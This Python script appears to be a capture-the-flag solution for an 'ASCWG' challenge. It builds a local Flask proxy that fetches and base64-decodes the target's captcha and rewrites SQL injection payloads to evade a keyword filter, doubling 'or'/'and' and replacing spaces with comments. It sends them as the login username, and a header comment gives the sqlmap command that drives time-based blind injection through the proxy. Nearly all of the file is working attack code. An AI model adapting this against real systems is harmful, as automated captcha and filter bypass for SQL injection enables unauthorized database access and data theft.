# Kenzy challenge from ASCWG CTF
# Sqli with captcha
# Type: time-based blind
# Command: python sqlmap.py -u http://127.0.0.1:5000/query-example?language=* --dbs

import requests
import json
import base64
from flask import Flask, request
app = Flask(__name__)


def GetCaptcha():
    session = requests.session()
    burp0_url = "http://34.175.249.72:60001/scripts/captcha.php"
    burp0_cookies = {"PHPSESSID": "5759ri1eo8d6kkkl5otr7slfit"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36", "Accept": "image/avif,image/webp,*/*", "Accept-Language": "ar,en-US;q=0.7,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Referer": "http://34.175.249.72:60001/"}
    x = session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    Cap = x.text[-25:]
    xx = "{"
    CaptchaX = f"{xx}{Cap}"+"}"
    z = json.loads(CaptchaX) 
    encoded = base64.b64decode(z["CAPTCHA"])
    encoded2 = base64.b64decode(encoded)
    CCode = encoded2.decode()
    return CCode 





def Login(x):
    session = requests.session()
    burp0_url = "http://34.175.249.72:60001/index.php"
    burp0_cookies = {"PHPSESSID": "5759ri1eo8d6kkkl5otr7slfit"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "ar,en-US;q=0.7,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://34.175.249.72:60001", "Connection": "close", "Referer": "http://34.175.249.72:60001/", "Upgrade-Insecure-Requests": "1"}
    CaptcahCode= GetCaptcha() 
    xx = x.replace("or", "oorr")
    xxx = xx.replace("and", "anandd")
    xxxx = xxx.replace(" ","/**/")
    xxxxx = xxxx.replace("AND","AANDND")
    xxxxxx = xxxxx.replace("OR","OORR")
    payload = xxxxxx
#   print("[+] Payload : {}".format(payload))
    burp0_data = {"username": f"{payload}", "password": "asdsd", "captcha": f"{CaptcahCode}", "send": "l"}
    xx = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    return xx.text
	



@app.route('/query-example')
def query_example():
	# if key doesn't exist, returns None
	language = request.args.get('language')
	return Login(language)




if __name__ == '__main__':
	app.run()
